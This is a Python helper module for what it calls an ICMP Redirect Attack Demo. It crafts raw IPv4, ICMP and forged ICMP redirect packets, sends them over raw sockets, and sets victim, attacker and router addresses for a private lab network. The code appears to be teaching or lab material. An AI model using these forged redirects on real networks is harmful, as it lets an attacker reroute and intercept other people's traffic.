#!/usr/bin/env python3
"""
Utility module for ICMP Redirect Attack Demo
Common packet crafting functions used across multiple scripts.
"""

import socket
import struct

class PacketCrafter:
    """Raw packet crafting utilities for network packets"""
    
    @staticmethod
    def calculate_checksum(data):
        """Calculate Internet checksum for given data
        
        Args:
            data (bytes): Data to calculate checksum for
            
        Returns:
            int: Calculated checksum value
        """
        if len(data) % 2 == 1:
            data += b'\x00'
        
        checksum = 0
        for i in range(0, len(data), 2):
            word = (data[i] << 8) + data[i + 1]
            checksum += word
        
        while checksum >> 16:
            checksum = (checksum & 0xFFFF) + (checksum >> 16)
        
        return ~checksum & 0xFFFF

    @staticmethod
    def create_ip_header(src_ip, dst_ip, protocol, payload_length, identification=None):
        """Create IPv4 header from scratch
        
        Args:
            src_ip (str): Source IP address
            dst_ip (str): Destination IP address
            protocol (int): Protocol number (1 for ICMP, 6 for TCP, etc.)
            payload_length (int): Length of payload data
            identification (int, optional): IP identification field
            
        Returns:
            bytes: Complete IPv4 header with calculated checksum
        """
        version_ihl = (4 << 4) + 5  # Version 4, Header Length 5 (20 bytes)
        type_of_service = 0
        total_length = 20 + payload_length
        if identification is None:
            identification = 12345  # Default identification
        flags_fragment = 0
        ttl = 64
        header_checksum = 0
        
        header = struct.pack('!BBHHHBBH4s4s',
                           version_ihl, type_of_service, total_length,
                           identification, flags_fragment, ttl, protocol,
                           header_checksum, socket.inet_aton(src_ip),
                           socket.inet_aton(dst_ip))
        
        checksum = PacketCrafter.calculate_checksum(header)
        header = header[:10] + struct.pack('!H', checksum) + header[12:]
        
        return header

    @staticmethod
    def create_icmp_packet(packet_type, code, identifier, sequence, payload=b''):
        """Create ICMP packet from scratch
        
        Args:
            packet_type (int): ICMP type (8 for Echo Request, 0 for Echo Reply, etc.)
            code (int): ICMP code
            identifier (int): ICMP identifier
            sequence (int): ICMP sequence number
            payload (bytes, optional): ICMP payload data
            
        Returns:
            bytes: Complete ICMP packet with calculated checksum
        """
        checksum = 0
        
        icmp_header = struct.pack('!BBHHH',
                                packet_type, code, checksum,
                                identifier, sequence)
        
        icmp_packet = icmp_header + payload
        checksum = PacketCrafter.calculate_checksum(icmp_packet)
        
        icmp_header = struct.pack('!BBHHH',
                                packet_type, code, checksum,
                                identifier, sequence)
        
        return icmp_header + payload

    @staticmethod
    def create_icmp_redirect_packet(gateway_ip, original_ip_header, original_data):
        """Create ICMP Redirect packet from scratch
        
        Args:
            gateway_ip (str): IP address of the new gateway
            original_ip_header (bytes): Original IP header that triggered redirect
            original_data (bytes): Original payload data (first 8 bytes)
            
        Returns:
            bytes: Complete ICMP redirect packet with calculated checksum
        """
        icmp_type = 5  # Redirect
        icmp_code = 1  # Redirect for host
        icmp_checksum = 0  # Will be calculated
        gateway_addr = socket.inet_aton(gateway_ip)
        
        # ICMP Redirect includes original IP header + 8 bytes of original data
        original_packet = original_ip_header + original_data[:8]
        
        # Pack ICMP header
        icmp_header = struct.pack('!BBH4s', icmp_type, icmp_code, icmp_checksum, gateway_addr)
        
        # Calculate checksum for entire ICMP packet
        icmp_packet = icmp_header + original_packet
        checksum = PacketCrafter.calculate_checksum(icmp_packet)
        
        # Repack with correct checksum
        icmp_header = struct.pack('!BBH4s', icmp_type, icmp_code, checksum, gateway_addr)
        icmp_packet = icmp_header + original_packet
        
        return icmp_packet

    @staticmethod
    def send_raw_packet(packet, target_ip):
        """Send raw packet using raw socket
        
        Args:
            packet (bytes): Complete packet to send (including IP header)
            target_ip (str): Target IP address
            
        Raises:
            Exception: If packet sending fails
        """
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_RAW)
            sock.setsockopt(socket.IPPROTO_IP, socket.IP_HDRINCL, 1)
            sock.sendto(packet, (target_ip, 0))
            sock.close()
        except Exception as e:
            raise Exception(f"Packet sending error: {e}")

# Network Configuration Constants
class NetworkConfig:
    """Network configuration constants for the attack demo"""
    
    # Dual-subnet topology for proper ICMP redirect attack
    # Victim Network (192.168.1.0/24)
    VICTIM_IP = "192.168.1.10"
    ATTACKER_IP = "192.168.1.20"
    ROUTER_VICTIM_IP = "192.168.1.1"
    
    # Target Network (192.168.2.0/24)
    TARGET_IP = "192.168.2.10"
    ROUTER_TARGET_IP = "192.168.2.1"
    
    # For backward compatibility
    ROUTER_IP = ROUTER_VICTIM_IP  # Default router IP for victim
    
    # Network subnets
    VICTIM_SUBNET = "192.168.1.0/24"
    TARGET_SUBNET = "192.168.2.0/24"
    
    # ICMP Types
    ICMP_ECHO_REQUEST = 8
    ICMP_ECHO_REPLY = 0
    ICMP_REDIRECT = 5
    
    # ICMP Codes for Redirect
    ICMP_REDIRECT_NET = 0
    ICMP_REDIRECT_HOST = 1
    ICMP_REDIRECT_TOS_NET = 2
    ICMP_REDIRECT_TOS_HOST = 3
    
    # Protocol Numbers
    IPPROTO_ICMP = 1
    IPPROTO_TCP = 6
    IPPROTO_UDP = 17

# Utility Functions
def format_ip_address(ip_bytes):
    """Convert 4-byte IP address to string format
    
    Args:
        ip_bytes (bytes): 4-byte IP address
        
    Returns:
        str: IP address in dotted decimal notation
    """
    return socket.inet_ntoa(ip_bytes)

def parse_ip_header(ip_packet):
    """Parse IP header and return header fields
    
    Args:
        ip_packet (bytes): IP packet starting with IP header
        
    Returns:
        dict: Dictionary containing parsed IP header fields
    """
    if len(ip_packet) < 20:
        raise ValueError("Packet too short for IP header")
    
    ip_header = ip_packet[:20]
    version_ihl, tos, total_len, ip_id, flags_frag, ttl, protocol, checksum, src, dst = struct.unpack('!BBHHHBBH4s4s', ip_header)
    
    return {
        'version': (version_ihl >> 4),
        'header_length': (version_ihl & 0xF) * 4,
        'type_of_service': tos,
        'total_length': total_len,
        'identification': ip_id,
        'flags': (flags_frag >> 13),
        'fragment_offset': (flags_frag & 0x1FFF),
        'ttl': ttl,
        'protocol': protocol,
        'checksum': checksum,
        'source_ip': format_ip_address(src),
        'destination_ip': format_ip_address(dst),
        'header_bytes': ip_header
    }

def parse_icmp_header(icmp_packet):
    """Parse ICMP header and return header fields
    
    Args:
        icmp_packet (bytes): ICMP packet starting with ICMP header
        
    Returns:
        dict: Dictionary containing parsed ICMP header fields
    """
    if len(icmp_packet) < 8:
        raise ValueError("Packet too short for ICMP header")
    
    icmp_header = icmp_packet[:8]
    icmp_type, icmp_code, checksum, identifier, sequence = struct.unpack('!BBHHH', icmp_header)
    
    return {
        'type': icmp_type,
        'code': icmp_code,
        'checksum': checksum,
        'identifier': identifier,
        'sequence': sequence,
        'payload': icmp_packet[8:]
    }
